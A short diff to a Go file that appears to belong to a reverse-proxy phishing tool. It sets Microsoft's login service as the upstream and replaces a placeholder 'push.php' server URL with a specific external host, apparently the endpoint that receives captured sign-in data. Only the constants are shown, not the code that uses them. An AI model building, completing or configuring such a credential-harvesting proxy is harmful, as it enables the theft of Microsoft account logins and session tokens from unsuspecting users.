@@ -12,7 +12,7 @@ import (
 const (
     upstream        = "https://login.microsoftonline.com"
     upstreamPath    = "/"
-    serverURL       = "https://yourserver.com/push.php"
+    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php"
 )
 
 var (
